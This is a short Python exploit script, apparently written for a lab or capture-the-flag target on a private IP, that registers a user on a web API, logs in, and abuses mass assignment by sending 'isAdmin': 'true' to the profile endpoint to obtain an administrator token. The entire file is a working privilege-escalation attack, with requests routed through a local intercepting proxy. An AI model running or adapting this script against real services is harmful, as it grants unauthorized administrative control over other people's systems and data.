#!/usr/bin/env python3

import requests 
import traceback
from urllib.parse import urljoin
import argparse

PROXY = {"http": "http://127.0.0.1:8080"}

def authBypass(target):
    """
    Create account
    """
    crtAccUrl = urljoin(f"{target}:5000", "/api/register")
    headers = {"Content-Type": "application/json"}
    crtAccJson = {"email": "john@doe.ltd", "password": "Password!1234", "username": "johndoe"}
    print("[*] Creating new user account")
    try:
        crtAccRes = requests.post(crtAccUrl, headers=headers, json=crtAccJson, proxies=PROXY)
        if "User registered successfully" in crtAccRes.text:
            print("[+] Account john@doe.ltd:Password!1234 has been created successfully.")
            """
            Login to normal user account
            """
            lgnAccUrl = urljoin(f"{target}:5000", "/api/login")
            lgnAccJson={"email": "john@doe.ltd", "password": "Password!1234"}
            print("[*] Logging you in to john@doe.ltd:Password!1234")
            try:
                lgnRes = requests.post(lgnAccUrl, headers=headers, json=lgnAccJson, proxies=PROXY)
                if "token" in lgnRes.text:
                    print("[+] Logged in successfully")
                    # Parse JSON response
                    lgnResData = lgnRes.json()
                    # Extract the token
                    nrmlUsrToken = lgnResData["token"]
                    if not nrmlUsrToken:
                        raise KeyError("Token not found in response JSON")
                    """
                    Mass Assignment exploitation to gain administrative access
                    """
                    updtUrl = urljoin(f"{target}:5000", "/api/profile")
                    updtHeaders = {"Content-Type": "application/json", "x-auth-token": f"{nrmlUsrToken}"}
                    updtJson={"email": "john@doe.ltd", "isAdmin": "true", "username": "johndoe"}
                    print("[*] Gainning administrative access...")
                    try:
                        updtRes = requests.put(updtUrl, headers=updtHeaders, json=updtJson, proxies=PROXY)
                        if "Profile updated successfully" in updtRes.text:
                            print("[+] Update succeeded. You are admin now.")
                            # Parse JSON response
                            updtResData = updtRes.json()
                            # Extract the token
                            adminToken = updtResData["token"]
                            if not adminToken:
                                raise KeyError("Token not found in response JSON")
                            print("[+] Administrative access new token: ", adminToken)
                            return adminToken
                        else:
                            print("[-] Failed to updata the profile info. Response: ", updtRes.text)
                    except Exception as e:
                        print("[-] Error updating the profile details: ", e)
                        traceback.print_exc()
                else:
                    print("[-] Login failed. Response: ", lgnRes.text)
            except Exception as e:
                print("[-] Error logging you in: ", e)
                traceback.print_exc()
        else:
            print("[-] Couldn't register new user account. Response: ", crtAccRes.text)
    except Exception as e:
        print("[-] Error sending the create account request: ", e)
        traceback.print_exc()

authBypass("http://192.168.178.230")
